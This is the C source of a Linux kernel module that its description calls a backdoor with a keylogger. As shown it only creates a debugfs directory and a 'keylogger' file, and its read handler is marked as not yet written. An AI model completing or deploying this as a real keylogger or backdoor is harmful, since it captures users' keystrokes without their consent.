#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/debugfs.h>
#include <linux/stat.h>

// Declarations 
/**
 * @brief struct dentry is used in the Linux kernel to represent directory entries. It is defined in the Linux kernel source code and is part of the Virtual File System (VFS) layer. The struct dentry structure contains information about a particular directory entry, including its name, inode (index node) pointer, and various other attributes
 */
static struct dentry *file;
static struct dentry *subdir;

/**
 * @brief change the way that the kernel will manage the file
 * 
 */
const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	// . read = not created yet
};

static int __init backdoor_init(void){    
    printk(KERN_INFO "[+] Backdoor Initialized\n");

    // SUBDIR CONFIGURATIONS
    subdir = debugfs_create_dir("backdoor", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keylogger", 0400, subdir, NULL, &keys_fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}


    return 0;
}

static void __exit backdoor_exit(void){
    printk(KERN_INFO "[-] Backdoor Finished\n");
    debugfs_remove_recursive(subdir);
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michel Hecker Faria");
MODULE_DESCRIPTION("A simple backdoor with keylogger to debugfs");
